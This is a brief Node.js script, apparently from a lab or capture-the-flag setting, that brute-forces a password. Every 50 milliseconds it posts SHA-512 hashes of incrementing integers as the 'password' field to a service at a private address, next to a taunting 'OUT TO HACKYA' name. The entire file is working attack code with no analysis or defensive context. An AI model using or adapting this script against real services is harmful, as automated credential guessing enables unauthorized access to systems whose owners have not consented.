'use strict';
var request = require('request');
var crypto = require('crypto');



var num = 1;

setInterval(function() {

  let hash = crypto.createHash('sha512');
  let digest = hash.update(num.toString()).digest('hex');
  console.log(digest);


  request.post({url: 'http://10.0.1.35:1337', form: {

                      'name': 'OUT TO HACKYA',
                      'video': 'https://www.youtube.com/watch?v=UePtoxDhJSw',
                      'password': digest

    }}, function(error, response, body) {

      if(error) {
        console.log(error);
      }
      if(!error && response.statusCode == 200) {
        //SOME RESPONSE BODY
        console.log(body);
      }
  });
    num +=1;

}, 50);















